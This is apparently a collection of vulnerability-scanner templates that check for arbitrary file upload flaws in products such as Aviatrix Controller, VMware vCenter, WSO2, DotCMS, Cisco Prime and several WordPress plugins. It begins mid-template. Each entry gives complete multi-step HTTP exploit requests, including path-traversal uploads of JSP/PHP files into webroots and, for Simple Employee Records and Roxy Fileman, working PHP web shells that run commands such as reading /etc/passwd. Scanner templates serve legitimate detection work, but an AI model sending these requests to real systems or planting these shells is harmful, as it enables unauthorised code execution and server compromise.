**Type - word**

- words
  1. File uploaded successfully.
- part - body

**Type - dsl**

- dsl
  1. len(body) == 28

---

# Aviatrix Controller 6.x before 6.5-1804.1922 Remote Command Execution

## Description

- Aviatrix Controller 6.x before 6.5-1804.1922 contains a vulnerability that allows unrestricted upload of a file with a dangerous type, which allows an unauthenticated user to execute arbitrary code via directory traversal.
- severity - critical
- tags - cve,cve2021,rce,aviatrix,kev,fileupload,intrusive

## Requests

### Step - 1

```
POST /v1/backend1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/{{randstr}}.php&data=HACKERMAN<?php phpinfo()?>

```

### Step - 2

```
GET /v1/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. HACKERMAN
  2. PHP Extension
  3. PHP Version
- condition - and

---

# VMware vCenter Server - Arbitrary File Upload

## Description

- VMware vCenter Server contains an arbitrary file upload vulnerability in the Analytics service. A malicious actor with network access to port 443 on vCenter Server may exploit this issue to execute code on vCenter Server by uploading a specially crafted file.
- severity - critical
- tags - cve,cve2021,vmware,vcenter,fileupload,kev,intrusive

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /analytics/telemetry/ph/api/hyper/send?_c&_i=test HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

test_data

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 200
  2. status_code_2 == 201
  3. contains(body_1, 'VMware vSphere')
  4. content_length_2 == 0
- condition - and

---

# FortiLogger 4.4.2.2 - Arbitrary File Upload

## Description

- FortiLogger 4.4.2.2 is affected by arbitrary file upload issues. Attackers can send a "Content-Type: image/png" header to Config/SaveUploadedHotspotLogoFile and then Assets/temp/hotspot/img/logohotspot.asp.

- severity - critical
- tags - fortilogger,fortigate,fortinet,packetstorm,cve,cve2021,fileupload,intrusive

## Requests

### Step - 1

```
POST /Config/SaveUploadedHotspotLogoFile HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS
Accept: application/json
Referer: {{BaseURL}}
Connection: close
X-Requested-With: XMLHttpRequest

------WebKitFormBoundarySHHbUsfCoxlX1bpS
Content-Disposition: form-data; name="file"; filename="poc.txt"
Content-Type: image/png

POC_TEST

------WebKitFormBoundarySHHbUsfCoxlX1bpS

```

### Step - 2

```
GET /Assets/temp/hotspot/img/logohotspot.txt HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. POC_TEST
- part - body

**Type - word**

- words
  1. text/plain
  2. ASP.NET
- condition - and
- part - header

---

# WordPress Imagements \<=1.2.5 - Arbitrary File Upload

## Description

- WordPress Imagements plugin through 1.2.5 is susceptible to arbitrary file upload which can lead to remote code execution. The plugin allows images to be uploaded in comments but only checks for the Content-Type in the request to forbid dangerous files. An attacker can upload arbitrary files by using a valid image Content-Type along with a PHP filename and code.

- severity - critical
- tags - cve,wp,unauth,imagements,wpscan,cve2021,fileupload,wordpress,wp-plugin,intrusive

## Requests

### Step - 1

```
POST /wp-comments-post.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIYl2Oz8ptq5OMtbU

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment"

{{randstr}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="author"

{{randstr}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="email"

{{randstr}}@email.com
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="url"

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="checkbox"


yes
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="naam"

{{randstr}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="image"; filename="{{php}}"
Content-Type: image/jpeg

<?php echo 'CVE-2021-24236'; ?>

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="submit"

Post Comment
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment_post_ID"

{{post}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment_parent"

0
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU--

```

### Step - 2

```
GET /wp-content/plugins/imagements/images/{{php}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_2
- words
  1. CVE-2021-24236

---

# Cisco HyperFlex HX Data Platform - Arbitrary File Upload

## Description

- Cisco HyperFlex HX Data Platform contains an arbitrary file upload vulnerability in the web-based management interface. An attacker can send a specific HTTP request to an affected device, thus enabling upload of files to the affected device with the permissions of the tomcat8 user.
- severity - medium
- tags - fileupload,intrusive,packetstorm,cve,cve2021,cisco

## Requests

### Step - 1

```
POST /upload HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------253855577425106594691130420583
Origin: {{RootURL}}
Referer: {{RootURL}}

-----------------------------253855577425106594691130420583
Content-Disposition: form-data; name="file"; filename="../../../../../tmp/passwd9"
Content-Type: application/json

MyPasswdNewData->/api/tomcat

-----------------------------253855577425106594691130420583--

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. application/json
- part - header

**Type - word**

- words
  1. {"result":
  2. "filename:
  3. /tmp/passwd9
- condition - and

---

# Telesquare TLR-2005KSH 1.0.0 - Arbitrary File Upload

## Description

- TLR-2005KSH is affected by an incorrect access control vulnerability. THe PUT method is enabled so an attacker can upload arbitrary files including HTML and CGI formats.

- severity - critical
- tags - cve,cve2021,telesquare,intrusive,fileupload,packetstorm

## Requests

### Step - 1

```
GET /{{randstr}}.txt HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
PUT /{{randstr}}.txt HTTP/1.1
Host: {{Hostname}}

CVE-2021-45428

```

### Step - 3

```
GET /{{randstr}}.txt HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 404 && status_code_2 == 201
  2. contains(body_3, "CVE-2021-45428") && status_code_3 == 200
- condition - and

---

# WordPress Kaswara Modern VC Addons \<=3.0.1 - Arbitrary File Upload

## Description

- WordPress Kaswara Modern VC Addons plugin through 3.0.1 is susceptible to an arbitrary file upload. The plugin allows unauthenticated arbitrary file upload via the uploadFontIcon AJAX action, which can be used to obtain code execution. The supplied zipfile is unzipped in the wp-content/uploads/kaswara/fonts_icon directory with no checks for malicious files such as PHP.

- severity - critical
- tags - intrusive,unauth,fileupload,wpscan,cve,wordpress,wp-plugin,rce,cve2021,wp

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php?action=uploadFontIcon HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=------------------------d3be34324392a708

--------------------------d3be34324392a708
Content-Disposition: form-data; name="fonticonzipfile"; filename="{{zip_file}}.zip"
Content-Type: application/octet-stream

{{hex_decode('504B03040A0000000000FA73F454B2333E07140000001400000006001C00')}}{{php_file}}{{hex_decode('555409000366CBD76267CBD76275780B000104F50100000414000000')}}{{php_cmd}}{{hex_decode('0A504B01021E030A00000000002978F454E49BC1591300000013000000060018000000000001000000A48100000000')}}{{php_file}}{{hex_decode('555405000366CBD76275780B000104F50100000414000000504B050600000000010001004C000000530000000000')}}
--------------------------d3be34324392a708
Content-Disposition: form-data; name="fontsetname"

{{zip_file}}
--------------------------d3be34324392a708
Content-Disposition: form-data; name="action"

uploadFontIcon
--------------------------d3be34324392a708--

```

### Step - 2

```
GET /wp-content/uploads/kaswara/fonts_icon/{{zip_file}}/{{php_file}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_1
- words
  1. wp-content/uploads/kaswara/fonts_icon/{{zip_file}}/style.css

**Type - word**

- part - body_2
- words
  1. phpinfo()

**Type - status**

- status
  1. 200

---

# Simple Employee Records System 1.0 - Unrestricted File Upload

## Description

- Simple Employee Records System 1.0 contains an arbitrary file upload vulnerability due to client-side validation of file extensions. This can be used to upload executable code to the server to obtain access or perform remote command execution.

- severity - high
- tags - edb,cve,cve2019,rce,intrusive,fileupload

## Requests

### Step - 1

```
POST /dashboard/uploadID.php HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------5825462663702204104870787337

-----------------------------5825462663702204104870787337
Content-Disposition: form-data; name="employee_ID"; filename="poc.php"
Content-Type: image/png

<?php
$cmd=$_GET['cmd'];
system($cmd);
?>
-----------------------------5825462663702204104870787337--

```

### Step - 2

```
GET /uploads/employees_ids/{{endpoint}}?cmd=cat%20/etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
- condition - and

### Extractors

**Type - regex**

- name - endpoint
- part - body
- internal - True
- regex
  1. (?:[a-zA-Z0-9+\/])\*\_poc.php

---

# Cisco Prime Infrastructure and Cisco Evolved Programmable Network Manager - Remote Code Execution

## Description

- Cisco Prime Infrastructure (PI) and Cisco Evolved Programmable Network (EPN) Manager could allow an authenticated, remote attacker to execute code with root-level privileges on the underlying operating system. This vulnerability exist because the software improperly validates user-supplied input. An attacker could exploit this vulnerability by uploading a malicious file to the administrative web interface. A successful exploit could allow the attacker to execute code with root-level privileges on the underlying operating system.
- severity - critical
- tags - cve,cve2019,rce,fileupload,unauth,intrusive,cisco

## Requests

### Step - 1

```
POST /servlet/UploadServlet HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Primary-IP: 127.0.0.1
Filename: test.tar
Filesize: 10240
Compressed-Archive: false
Destination-Dir: tftpRoot
Filecount: 1
Content-Length: 269
Content-Type: multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83

--871a4a346a547cf05cb83f57b9ebcb83
Content-Disposition: form-data; name="files"; filename="test.tar"

../../opt/CSCOlumos/tomcat/webapps/ROOT/test.txt0000644000000000000000000000000400000000000017431 0ustar  00000000000000{{randstr}}
--871a4a346a547cf05cb83f57b9ebcb83--

```

### Step - 2

```
GET /test.txt HTTP/1.1
Host: {{Host}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code == 200
  2. contains((body_2), '{{randstr}}')
- condition - and

---

# DotCMS - Arbitrary File Upload

## Description

- DotCMS management system contains an arbitrary file upload vulnerability via the /api/content/ path which can allow attackers to upload malicious Trojans to obtain server permissions.
- severity - critical
- tags - packetstorm,cve,cve2022,rce,dotcms,kev,fileupload,intrusive

## Requests

### Step - 1

```
POST /api/content/ HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=------------------------aadc326f7ae3eac3

--------------------------aadc326f7ae3eac3
Content-Disposition: form-data; name="name"; filename="../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/{{randstr}}.jsp"
Content-Type: text/plain

<%
out.println("CVE-2022-26352");
%>
--------------------------aadc326f7ae3eac3--

```

### Step - 2

```
GET /{{randstr}}.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "CVE-2022-26352")
  2. status_code_2 == 200
- condition - and

---

# WordPress HTML2WP \<=1.0.0 - Arbitrary File Upload

## Description

- WordPress HTML2WP plugin through 1.0.0 contains an arbitrary file upload vulnerability. The plugin does not perform authorization and CSRF checks when importing files and does not validate them. As a result, an attacker can upload arbitrary files on the remote server.

- severity - critical
- tags - wp-plugin,wp,fileupload,unauth,wpscan,cve2022,wordpress,intrusive,cve,html2wp

## Requests

### Step - 1

```
POST /wp-admin/admin.php?page=html2wp-settings HTTP/1.1
Host: {{Hostname}}
Content-Length: 253
Content-Type: multipart/form-data; boundary=---------------------------7816508136577551742878603990
Connection: close

-----------------------------7816508136577551742878603990
Content-Disposition: form-data; name="local_importing[]"; filename="{{randstr}}.php"
Content-Type: text/html

<?php

echo "File Upload success";

-----------------------------7816508136577551742878603990--

```

### Step - 2

```
GET /wp-content/uploads/html2wp/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 302
  2. status_code_2 == 200
  3. contains(body_2, 'File Upload success')
- condition - and

---

# WSO2 Management - Arbitrary File Upload & Remote Code Execution

## Description

- Certain WSO2 products allow unrestricted file upload with resultant remote code execution. This affects WSO2 API Manager 2.2.0 and above through 4.0.0; WSO2 Identity Server 5.2.0 and above through 5.11.0; WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, and 5.6.0; WSO2 Identity Server as Key Manager 5.3.0 and above through 5.10.0; and WSO2 Enterprise Integrator 6.2.0 and above through 6.6.0.

- severity - critical
- tags - cve,cve2022,rce,fileupload,wso2,intrusive,kev

## Requests

### Step - 1

```
POST /fileupload/toolsAny HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311
Content-Length: 348

-----------------------------250033711231076532771336998311
Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/{{to_lower("{{randstr}}")}}.jsp";filename="test.jsp"
Content-Type: application/octet-stream

<% out.print("WSO2-RCE-CVE-2022-29464"); %>
-----------------------------250033711231076532771336998311--

```

### Step - 2

```
GET /authenticationendpoint/{{to_lower("{{randstr}}")}}.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, 'WSO2-RCE-CVE-2022-29464')

---

# WordPress Contact Form 7 \<1.3.6.3 - Stored Cross-Site Scripting

## Description

- WordPress Contact Form 7 before 1.3.6.3 contains an unauthenticated stored cross-site scripting vulnerability in the Drag and Drop Multiple File Upload plugin. SVG files can be uploaded by default via the dnd_codedropz_upload AJAX action.

- severity - medium
- tags - cve,cve2022,xss,wordpress,wp-plugin,wpscan,fileupload,intrusive,unauth

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161

-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="size_limit"

10485760
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="action"

dnd_codedropz_upload
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="type"

click
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.svg"
Content-Type: image/jpeg

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
-----------------------------92633278134516118923780781161--

```

### Step - 2

```
GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.svg HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "alert(document.domain)")
  2. status_code_2 == 200
- condition - and

---

# Detect Telerik Web UI Fileupload Handler

## Description

- This template detects the Telerik Web UI fileupload handler.
- severity - info
- tags - tech,telerik,fileupload

## Requests

- Method - GET

### URL

- {{BaseURL}}/Telerik.Web.UI.WebResource.axd?type=rau

### Matchers

**Type - word**

- words
  1. RadAsyncUpload handler is registered succesfully

---

# CX Cloud Unauthenticated Upload - Detect

## Description

- CX Cloud unauthenticated upload was detected.
- severity - info
- tags - fileupload

## Requests

- Method - GET

### URL

- {{BaseURL}}/upload.jsp

### Matchers

**Type - word**

- words
  1. \<HEAD>\<TITLE>Display file upload form to the user\</TITLE>\</HEAD>
- condition - and

---

# Unauthenticated Popup File Upload - Detect

## Description

- Endpoints where files can be uploaded without authentication were detected.
- severity - info
- tags - edb,fileupload

## Requests

- Method - GET

### URL

- {{BaseURL}}/RichWidgets/Popup_Upload.aspx

### Matchers

**Type - word**

- words
  1. Popup Upload
- part - body

**Type - status**

- status
  1. 200

---

# Roxy Fileman 1.4.4 - Arbitrary File Upload

## Description

- Roxy Fileman 1.4.4 is susceptible to remote code execution via the FORBIDDEN_UPLOADS setting, which is checked when renaming an existing file to a new file extension. An attacker can bypass this check and rename already uploaded files to any extension using the move function, which does not perform any checks.

- severity - high
- tags - intrusive,misconfig,edb,roxy,fileman,rce,fileupload

## Requests

### Step - 1

```
POST /php/upload.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6rbEqFAMRkE0RAB7

------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="action"

upload
------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="method"

ajax
------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="d"

/app/Uploads
------WebKitFormBoundary6rbEqFAMRkE0RAB7
Content-Disposition: form-data; name="files[]"; filename="{{randstr}}.jpg"
Content-Type: image/jpeg

<?php
echo exec($_GET["cmd"]);
?>

------WebKitFormBoundary6rbEqFAMRkE0RAB7--

```

### Step - 2

```
POST /php/renamefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php

```

### Step - 3

```
POST /php/movefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php

```

### Step - 4

```
GET /Uploads/{{randstr}}.php?cmd=echo+"roxyfileman"+|+rev HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - regex**

- part - body
- regex
  1. namelifyxor

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---
